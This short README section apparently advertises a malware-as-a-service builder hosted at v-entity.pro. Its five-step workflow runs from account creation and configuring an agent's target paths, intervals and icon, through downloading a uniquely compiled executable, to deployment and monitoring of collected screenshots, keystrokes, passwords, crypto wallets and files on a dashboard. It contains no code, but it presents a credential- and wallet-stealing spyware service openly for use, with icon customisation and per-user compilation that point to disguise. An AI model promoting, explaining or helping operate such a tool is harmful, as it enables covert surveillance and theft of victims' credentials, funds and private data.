## 🚀 How It Works

```
1. Create your account  →  v-entity.pro
2. Configure agent      →  target paths, intervals, icon, compiler
3. Download             →  unique compiled executable
4. Deploy               →  agent collects & syncs to dashboard
5. Monitor              →  screenshots, keystrokes, passwords, wallets, files
```

All settings, captures, and storage are **isolated per user**.
